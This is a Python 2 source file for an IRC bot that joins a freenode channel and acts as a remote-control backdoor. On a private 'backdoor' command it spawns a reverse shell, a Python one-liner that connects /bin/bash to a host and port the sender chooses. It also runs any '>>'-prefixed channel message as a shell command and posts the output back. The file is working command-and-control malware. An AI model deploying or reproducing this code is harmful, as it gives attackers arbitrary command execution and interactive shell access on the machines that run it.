import sys
import socket
import string
import os
import subprocess
import shlex

HOST="chat.freenode.net"
PORT=6667
NICK="leKamel"
IDENT="Arabe bot"
REALNAME="Arabe"
readbuffer=""

s=socket.socket( )
s.connect((HOST, PORT))
s.send("NICK %s\r\n" % NICK)
s.send("USER %s %s bla :%s\r\n" % (IDENT, HOST, REALNAME))
s.send('JOIN #kamaoo' + '\r\n')

while 1:
    readbuffer=readbuffer+s.recv(1024)
    temp=string.split(readbuffer, "\n")
    readbuffer=temp.pop( )

    for line in temp:
        feed=string.rstrip(line)
        line=string.rstrip(line)
        line=string.split(line)
        print line
        pasale=False
        try:
            if any(">>hi" in s for s in line):
                s.send("PRIVMSG "+line[2]+" :Allahu Akbar" + "\r\n")
                pasale=True

            if any(">>join" in s for s in line):
                msgtosend="JOIN "+line[4]+"\r\n"
                #print "-->"+msgtosend + "<--"
                s.send(msgtosend)
                pasale=True
                
            if any(">>part" in s for s in line):
                msgtosend="PART "+line[4]+"\r\n"
                s.send(msgtosend)
                pasale=True
           
            if (NICK == line[2]):
                if (line[3] == ":backdoor"):
                    nick=line[0].split('!',1)
                    nick=nick[0].split(':',1)
                    nick=nick[1]
                    #print nick
                    msgtosend="PRIVMSG "+nick+" :Backdoor ready, execute  nc -l -p "+line[5]+" in your shell\r\n" 
                    command="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+line[4]+"\","+line[5]+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"+"\r\n"
                    print msgtosend
                    print command
                    s.send(msgtosend)
                    try:
                        msg = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
                    except:
                        nick=line[0].split('!',1)
                        nick=nick[0].split(':',1)
                        nick=nick[1]
                        e = sys.exc_info()[0]
                        pasale=True
                        msgtosend="PRIVMSG "+nick+" :%s\r\n" % e
                        s.send(msgtosend)
                    pasale=True

            if any(">>ver" in s for s in line):
                s.send("PRIVMSG "+line[2]+" :Ver. 0.000" + "\r\n")
                pasale=True

            if not pasale:
                if any(">>" in s for s in line):
                    cmd=""
                    argu=""

                    for idx, val in enumerate(line):
                        if (idx==4):
                            cmd=val
                        if (idx>4):
                            argu=argu+" "+val

                    print cmd+argu   
                    command=cmd+argu
                    pasale=False
                    try:
                        msg = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
                    except:
                        nick=line[0].split('!',1)
                        nick=nick[0].split(':',1)
                        nick=nick[1]
                        e = sys.exc_info()[0]
                        pasale=True
                        msgtosend="PRIVMSG "+nick+" :%s\r\n" % e
                        s.send(msgtosend)
 
                    if not pasale:
                        msgtosend=msg.replace('\n', ' ')
                        msgtosend="PRIVMSG "+line[2]+" :"+msgtosend+"\r\n"
                        print msgtosend
                        s.send(msgtosend)

        except IndexError:
            pass
        if (line[0]=="PING"):
            s.send("PONG %s\r\n" % line[1])
            s.send('JOIN #kamaoo' + '\r\n')
